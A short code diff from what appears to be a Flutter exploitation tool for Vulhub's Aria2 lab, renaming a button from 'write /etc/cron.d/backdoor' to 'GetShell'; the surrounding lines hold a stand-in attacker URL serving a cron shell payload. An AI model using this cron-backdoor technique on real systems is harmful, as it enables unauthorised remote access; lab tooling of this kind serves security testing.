@@ -123,7 +123,7 @@ class _Aria2PageState extends BaseVulhubExpPageState<Aria2ExpPage> {
             'http://attacker/shell.cron',
           ),
           const SizedBox(height: 8),
-          vBtn('写入 /etc/cron.d/backdoor', running ? null : _writeCron),
+          vBtn('GetShell', running ? null : _writeCron),
         ],
       ),
     );
